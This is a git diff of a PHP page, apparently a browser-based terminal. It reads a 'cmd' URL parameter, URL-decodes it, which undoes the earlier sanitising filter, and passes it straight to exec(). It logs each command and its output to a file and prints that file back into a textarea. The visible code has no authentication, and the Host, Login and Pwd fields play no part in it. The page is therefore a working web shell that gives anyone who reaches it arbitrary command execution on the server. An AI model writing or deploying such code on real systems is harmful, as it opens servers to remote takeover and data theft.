@@ -31,17 +31,22 @@ textarea {
         Host  <input type="text"/><br/>
         Login <input type="text"/><br/>
         Pwd   <input type="text"/><br/>
+        Cwd   <input type="text"/><br/>
 
-        <textarea id="textarea" rows="20"><?php
+        <textarea id="textarea" rows="20" readonly><?php
         $cmd = filter_input(INPUT_GET, 'cmd', FILTER_SANITIZE_ENCODED);
         if (isset($cmd) && $cmd != "")
         {
-            exec($cmd, $output, $err);
-            file_put_contents("logs", "$cmd>\n", FILE_APPEND);
-            file_put_contents("logs", $output, FILE_APPEND);
-            echo file_get_contents("logs");            
+            $cmd = urldecode($cmd);
+            file_put_contents("logs", "\n>$cmd\n", FILE_APPEND);
+            exec($cmd, $output, $exitcode);
+            if ($exitcode !== 0)
+            {
+                file_put_contents("logs", "\nERRNR:".$exitcode . "\n", FILE_APPEND);
+            }
+            file_put_contents("logs", implode("\n",$output), FILE_APPEND);
         }
-
+        echo file_get_contents("logs");
         ?>
         </textarea><br/>
         <form name="subm" action="index.php" method="GET">
